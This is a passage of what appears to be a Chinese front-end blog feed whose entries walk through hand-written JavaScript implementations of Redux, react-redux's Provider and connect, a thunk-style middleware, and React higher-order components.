class="keyword">constructor</span>(props,context)&#123;</span><br><span class="line">        <span class="keyword">super</span>(props,context)</span><br><span class="line">        <span class="keyword">this</span>.store = props.store</span><br><span class="line">    &#125;</span><br><span class="line">    getChildContext()&#123;</span><br><span class="line">        <span class="comment">//把传进来的store放进全局</span></span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="attr">store</span>:<span class="keyword">this</span>.store&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    render()&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.props.children</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p><code>connect</code> 负责连接组件，给到<code>redux</code>里的数据放到组件的属性里</p></blockquote><ul><li>负责接收一个组件，把<code>state</code>里的一些数据放进去，返回一个组件</li><li>数据变化的时候，能够通知组件</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//高阶组件写法</span></span><br><span class="line"><span class="keyword">const</span> connect = <span class="function">(<span class="params">mapStateToProps=state=&gt;state,mapDispatchToProps=&#123;&#125;</span>)=&gt;</span><span class="function">(<span class="params">wrapperComponent</span>)=&gt;</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="class"><span class="keyword">class</span> <span class="title">ConnectComponent</span> <span class="keyword">extends</span> <span class="title">React</span>.<span class="title">Component</span> </span>&#123;</span><br><span class="line">        <span class="comment">//负责接收组件</span></span><br><span class="line">        <span class="keyword">static</span> contextTypes = &#123;</span><br><span class="line">            store:PropTypes.obejct</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">constructor</span>(props)&#123;</span><br><span class="line">            <span class="keyword">super</span>(props, context)&#123;</span><br><span class="line">                <span class="keyword">this</span>.state = &#123;</span><br><span class="line">                    props:&#123;&#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        componentDidMount()&#123;</span><br><span class="line">            <span class="keyword">const</span> &#123;store&#125; = <span class="keyword">this</span>.context</span><br><span class="line">            store.subscribe(<span class="function"><span class="params">()</span>=&gt;</span><span class="keyword">this</span>.update())</span><br><span class="line">            <span class="keyword">this</span>.update()</span><br><span class="line">        &#125;</span><br><span class="line">        update()&#123;</span><br><span class="line">            <span class="comment">//  获取mapStateToProps、mapDispatchToProps 放入this.props里</span></span><br><span class="line">            </span><br><span class="line">            <span class="keyword">const</span> &#123;store&#125;=<span class="keyword">this</span>.context</span><br><span class="line">            <span class="keyword">const</span> stateProps = mapStateToProps(store.getState())</span><br><span class="line">            <span class="keyword">const</span> dispatchProps = bindActionCreators(mapDispatchProps,store.dispatch)</span><br><span class="line">            <span class="keyword">this</span>.setState(&#123;</span><br><span class="line">                props:&#123;</span><br><span class="line">                    ...this.state.props,</span><br><span class="line">                    ...stateProps,</span><br><span class="line">                    ...dispatchProps</span><br><span class="line">                 &#125;</span><br><span class="line">            &#125;)</span><br><span class="line">        &#125;</span><br><span class="line">        render()&#123;</span><br><span class="line">            <span class="comment">// 把数据放入</span></span><br><span class="line">            <span class="keyword">return</span> <span class="xml"><span class="tag">&lt;<span class="name">wrapperComponent</span> &#123;<span class="attr">...this.state.props</span>&#125;/&gt;</span></span></span><br><span class="line"><span class="xml">        &#125;</span></span><br><span class="line"><span class="xml">    &#125;</span></span><br><span class="line"><span class="xml">&#125;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;code&gt;React&lt;/code&gt; 组件之间的通信是基于 &lt;code&gt;props&lt;/code&gt; 的单向数据流，即父组件通过 &lt;
      
    
    </summary>
    
      <category term="Front-End" scheme="http://blog.poetries.top/categories/Front-End/"/>
    
    
      <category term="JavaScript" scheme="http://blog.poetries.top/tags/JavaScript/"/>
    
      <category term="react" scheme="http://blog.poetries.top/tags/react/"/>
    
  </entry>
  
  <entry>
    <title>实现一个迷你版的redux</title>
    <link href="http://blog.poetries.top/2018/07/23/react-redux/"/>
    <id>http://blog.poetries.top/2018/07/23/react-redux/</id>
    <published>2018-07-23T01:20:24.000Z</published>
    <updated>2018-08-23T01:41:37.487Z</updated>
    
    <content type="html"><![CDATA[<h3 id="迷你版redux实现"><a href="#迷你版redux实现" class="headerlink" title="迷你版redux实现"></a>迷你版redux实现</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> createStore = <span class="function">(<span class="params">reducer,enhancer</span>)=&gt;</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(enhancer) &#123;</span><br><span class="line"><span class="keyword">return</span> enhancer(createStore)(reducer)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> currentState = &#123;&#125;</span><br><span class="line"><span class="keyword">let</span> currentListeners = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> getState = <span class="function"><span class="params">()</span>=&gt;</span>currentState</span><br><span class="line"><span class="keyword">const</span> subscribe = <span class="function">(<span class="params">listener</span>)=&gt;</span>&#123;</span><br><span class="line">currentListeners.push(listener)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> dispatch = <span class="function"><span class="params">action</span>=&gt;</span>&#123;</span><br><span class="line">currentState = reducer(currentState, action)</span><br><span class="line">currentListeners.forEach(<span class="function"><span class="params">v</span>=&gt;</span>v())</span><br><span class="line"><span class="keyword">return</span> action</span><br><span class="line">&#125;</span><br><span class="line">dispatch(&#123;<span class="attr">type</span>:<span class="string">'@@INIT'</span>&#125;)</span><br><span class="line"><span class="keyword">return</span> &#123;getState,subscribe,dispatch&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//中间件实现</span></span><br><span class="line"><span class="keyword">export</span> applyMiddleWare(...middlewares)&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="function"><span class="params">createStore</span>=&gt;</span>...args=&gt;&#123;</span><br><span class="line"><span class="keyword">const</span> store = createStore(...args)</span><br><span class="line"><span class="keyword">let</span> dispatch = store.dispatch</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> midApi = &#123;</span><br><span class="line">getState:store.getState,</span><br><span class="line">dispatch:...args=&gt;dispatch(...args)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> middlewaresChain = middlewares.map(<span class="function"><span class="params">middleware</span>=&gt;</span>middleware(midApi))</span><br><span class="line">dispatch = compose(...middlewaresChain)(store.dispatch)</span><br><span class="line"><span class="keyword">return</span> &#123;</span><br><span class="line">...store,</span><br><span class="line">dispatch</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// fn1(fn2(fn3())) 把函数嵌套依次调用</span></span><br><span class="line"><span class="keyword">export</span> <span class="function"><span class="keyword">function</span> <span class="title">compose</span>(<span class="params">...funcs</span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(funcs.length===<span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="function"><span class="params">arg</span>=&gt;</span>arg</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(funs.length===<span class="number">1</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> funs[<span class="number">0</span>]</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> funcs.reduce(<span class="function">(<span class="params">ret,item</span>)=&gt;</span><span class="function">(<span class="params">...args</span>)=&gt;</span>ret(item(...args)))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//bindActionCreator实现</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">bindActionCreator</span>(<span class="params">creator,dispatch</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> ...args=&gt;dispatch(creator(...args))</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">bindActionCreators</span>(<span class="params">creators,didpatch</span>)</span>&#123;</span><br><span class="line">    <span class="comment">//let bound = &#123;&#125;</span></span><br><span class="line">    <span class="comment">//Object.keys(creators).forEach(v=&gt;&#123;</span></span><br><span class="line">   <span class="comment">//     let creator = creator[v]</span></span><br><span class="line">     <span class="comment">//   bound[v] = bindActionCreator(creator,dispatch)</span></span><br><span class="line">    <span class="comment">//&#125;)</span></span><br><span class="line">    <span class="comment">//return bound</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">Object</span>.keys(creators).reduce(<span class="function">(<span class="params">ret,item</span>)=&gt;</span>&#123;</span><br><span class="line">    ret[item] = bindActionCreator(creators[item],dispatch)</span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line">    &#125;,&#123;&#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="react-redux实现"><a href="#react-redux实现" class="headerlink" title="react-redux实现"></a>react-redux实现</h3><blockquote><p>例子 provider组件就是使用context，把store放到context里，所有的子元素可以直接取到store</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> PropTypes <span class="keyword">from</span> <span class="string">'prop-types'</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Provider</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> childContextTypes = &#123;</span><br><span class="line">        store:Protypes.object</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">constructor</span>(props,context)&#123;</span><br><span class="line">        <span class="keyword">super</span>(props,context)</span><br><span class="line">        <span class="keyword">this</span>.store = props.store</span><br><span class="line">    &#125;</span><br><span class="line">    getChildContext()&#123;</span><br><span class="line">        <span class="comment">//把传进来的store放进全局</span></span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="attr">store</span>:<span class="keyword">this</span>.store&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    render()&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.props.children</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p><code>connect</code> 负责连接组件，给到<code>redux</code>里的数据放到组件的属性里</p></blockquote><ul><li>负责接收一个组件，把<code>state里</code>的一些数据放进去，返回一个组件</li><li>数据变化的时候，能够通知组件</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//高阶组件写法</span></span><br><span class="line"><span class="keyword">const</span> connect = <span class="function">(<span class="params">mapStateToProps=state=&gt;state,mapDispatchToProps=&#123;&#125;</span>)=&gt;</span><span class="function">(<span class="params">wrapperComponent</span>)=&gt;</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="class"><span class="keyword">class</span> <span class="title">ConnectComponent</span> <span class="keyword">extends</span> <span class="title">React</span>.<span class="title">Component</span> </span>&#123;</span><br><span class="line">        <span class="comment">//负责接收组件</span></span><br><span class="line">        <span class="keyword">static</span> contextTypes = &#123;</span><br><span class="line">            store:PropTypes.obejct</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">constructor</span>(props)&#123;</span><br><span class="line">            <span class="keyword">super</span>(props, context)&#123;</span><br><span class="line">                <span class="keyword">this</span>.state = &#123;</span><br><span class="line">                    props:&#123;&#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        componentDidMount()&#123;</span><br><span class="line">            <span class="keyword">const</span> &#123;store&#125; = <span class="keyword">this</span>.context</span><br><span class="line">            store.subscribe(<span class="function"><span class="params">()</span>=&gt;</span><span class="keyword">this</span>.update())</span><br><span class="line">            <span class="keyword">this</span>.update()</span><br><span class="line">        &#125;</span><br><span class="line">        update()&#123;</span><br><span class="line">            <span class="comment">//  获取mapStateToProps、mapDispatchToProps 放入this.props里</span></span><br><span class="line">            </span><br><span class="line">            <span class="keyword">const</span> &#123;store&#125;=<span class="keyword">this</span>.context</span><br><span class="line">            <span class="keyword">const</span> stateProps = mapStateToProps(store.getState())</span><br><span class="line">            <span class="keyword">const</span> dispatchProps = bindActionCreators(mapDispatchProps,store.dispatch)</span><br><span class="line">            <span class="keyword">this</span>.setState(&#123;</span><br><span class="line">                props:&#123;</span><br><span class="line">                    ...this.state.props,</span><br><span class="line">                    ...stateProps,</span><br><span class="line">                    ...dispatchProps</span><br><span class="line">                 &#125;</span><br><span class="line">            &#125;)</span><br><span class="line">        &#125;</span><br><span class="line">        render()&#123;</span><br><span class="line">            <span class="comment">// 把数据放入</span></span><br><span class="line">            <span class="keyword">return</span> <span class="xml"><span class="tag">&lt;<span class="name">wrapperComponent</span> &#123;<span class="attr">...this.state.props</span>&#125;/&gt;</span></span></span><br><span class="line"><span class="xml">        &#125;</span></span><br><span class="line"><span class="xml">    &#125;</span></span><br><span class="line"><span class="xml">&#125;</span></span><br></pre></td></tr></table></figure><p><strong>自己造一个中间件</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> thunk = <span class="function">(<span class="params">&#123;dispatch,getState&#125;</span>)=&gt;</span><span class="function"><span class="params">next</span>=&gt;</span><span class="function"><span class="params">action</span>=&gt;</span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">typeof</span> action == <span class="string">'function'</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> action(dispatch,getState)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">Array</span>.isArray(action)&#123;</span><br><span class="line"><span class="keyword">return</span> action.forEach(<span class="function"><span class="params">v</span>=&gt;</span>dispatch(v))</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//默认 什么都不做</span></span><br><span class="line"><span class="keyword">return</span> next(action)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;迷你版redux实现&quot;&gt;&lt;a href=&quot;#迷你版redux实现&quot; class=&quot;headerlink&quot; title=&quot;迷你版redux实现&quot;&gt;&lt;/a&gt;迷你版redux实现&lt;/h3&gt;&lt;figure class=&quot;highlight javascript&quot;&gt;&lt;tab
      
    
    </summary>
    
      <category term="Front-End" scheme="http://blog.poetries.top/categories/Front-End/"/>
    
    
      <category term="JavaScript" scheme="http://blog.poetries.top/tags/JavaScript/"/>
    
      <category term="react" scheme="http://blog.poetries.top/tags/react/"/>
    
  </entry>
  
  <entry>
    <title>浅析React高阶组件HOC</title>
    <link href="http://blog.poetries.top/2018/07/22/react-hoc/"/>
    <id>http://blog.poetries.top/2018/07/22/react-hoc/</id>
    <published>2018-07-22T16:10:24.000Z</published>
    <updated>2018-08-23T01:41:37.487Z</updated>
    
    <content type="html"><![CDATA[<h3 id="高阶组件是什么"><a href="#高阶组件是什么" class="headerlink" title="高阶组件是什么"></a>高阶组件是什么</h3><ul><li>高阶组件其实就是一个函数，传入一个组件返回一个新的组件。它接受一个组件作为参数，返回一个新的组件。这个新的组件会使用你传给它的组件作为子组件</li><li>高阶组件的作用其实不言而喻，其实就是为了组件之间的代码复用。组件可能有着某些相同的逻辑，把这些逻辑抽离出来，放到高阶组件中进行复用。高阶组件内部的包装组件和被包装组件之间通过 props 传递数据</li></ul><h3 id="如何实现高阶组件"><a href="#如何实现高阶组件" class="headerlink" title="如何实现高阶组件"></a>如何实现高阶组件</h3><blockquote><p>高阶组件其实就是处理react组件的函数。那么我们如何实现一个高阶组件？有两种方法</p></blockquote><p><strong>属性代理</strong></p><blockquote><p>属性代理是最常见的实现方式，将被处理组件的props和新的props一起传递给新组件</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="function"><span class="keyword">function</span> <span class="title">withHeader</span>(<span class="params">WrappedComponent</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="class"><span class="keyword">class</span> <span class="title">HOC</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">    render() &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line">        &lt;div className="demo-header"&gt;</span><br><span class="line">          我是标题</span><br><span class="line"><span class="xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">        &lt;WrappedComponent &#123;...this.props&#125;/&gt;</span><br><span class="line"><span class="xml">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">    &#125;</span></span><br><span class="line"><span class="xml">  &#125;</span></span><br><span class="line"><span class="xml">&#125;</span></span><br></pre></td></tr></table></figure><blockquote><p>在其他组件里，我们引用这个高阶组件，用来强化它</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">@withHeader</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">  render() &#123;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      &lt;div&gt;</span><br><span class="line">        我是一个普通组件</span><br><span class="line">      &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">    );</span></span><br><span class="line"><span class="regexp">  &#125;</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br></pre></td></tr></table></figure><blockquote><p>使用ES6写法可以更加简洁</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span>(title) =&gt; <span class="function">(<span class="params">WrappedComponent</span>) =&gt;</span> <span class="class"><span class="keyword">class</span> <span class="title">HOC</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">  render() &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line">      &lt;div className="demo-header"&gt;</span><br><span class="line">        &#123;title</span><br><span class="line">          ? title</span><br><span class="line">          : '我是标题'&#125;</span><br><span class="line"><span class="xml">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">      &lt;WrappedComponent &#123;...this.props&#125;/&gt;</span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">  &#125;</span></span><br><span class="line"><span class="xml">&#125;</span></span><br></pre></td></tr></table></figure><blockquote><p>从代码中看，就是使用HOC这个函数，向被处理的组件WrappedComponent上面添加一些属性，并返回一个包含原组件的新组件</p></blockquote><p><strong>反向继承</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">HOC</span>(<span class="params">WrappedComponent</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="class"><span class="keyword">class</span> <span class="title">HOC</span> <span class="keyword">extends</span> <span class="title">WrappedComponent</span> </span>&#123;</span><br><span class="line">        <span class="comment">//继承了传入的组件</span></span><br><span class="line">        test1()&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">this</span>.test2() + <span class="number">5</span>;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        componentDidMount()&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">'1'</span>);</span><br><span class="line">            <span class="keyword">this</span>.setState(&#123;<span class="attr">number</span>:<span class="number">2</span>&#125;);</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        render()&#123;</span><br><span class="line">            <span class="comment">//使用super调用传入组件的render方法</span></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">super</span>.render();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">@HOC</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OriginComponent</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">    <span class="keyword">constructor</span>(props)&#123;</span><br><span class="line">        <span class="keyword">super</span>(props);</span><br><span class="line">        <span class="keyword">this</span>.state = &#123;<span class="attr">number</span>:<span class="number">1</span>&#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    test2()&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">4</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    componentDidMount()&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'2'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    render()&#123;</span><br><span class="line">        <span class="keyword">return</span> (</span><br><span class="line">            &lt;div&gt;</span><br><span class="line">                &#123;<span class="keyword">this</span>.state.number&#125;&#123;<span class="string">'and'</span>&#125;</span><br><span class="line">                &#123;<span class="keyword">this</span>.test1()&#125;</span><br><span class="line">                这是原始组件</span><br><span class="line">            &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">        )</span></span><br><span class="line"><span class="regexp">    &#125;</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br><span class="line"><span class="regexp"> </span></span><br><span class="line"><span class="regexp">/</span><span class="regexp">/const newComponent = HOC(OriginComponent)</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;高阶组件是什么&quot;&gt;&lt;a href=&quot;#高阶组件是什么&quot; class=&quot;headerlink&quot; title=&quot;高阶组件是什么&quot;&gt;&lt;/a&gt;高阶组件是什么&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;高阶组件其实就是一个函数，传入一个组件返回一个新的组件。它接受一个组件作为参数，返回一个
      
    
    </summary>
    
      <category term="Front-End" scheme="http://blog.poetries.top/categories/Front-End/"/>
    
    
      <category term="JavaScript" scheme="http://blog.poetries.top/tags/JavaScript/"/>
    
      <category term="react" scheme="http://blog.poetries.top/tags/react/"/>
    
  </entry>
  
  <entry>
    <title>正则回顾总结</title>
    <link href="http://blog.poetries.top/2018/04/10/js-reg-review/"/>
    <id>http://blog.poetries.top/2018/04/10/js-reg-review/</id>
    <published>2018-04-10T02:09:43.000Z</published>
    <updated>2018-08-23T01:41:37.487Z</updated>
    
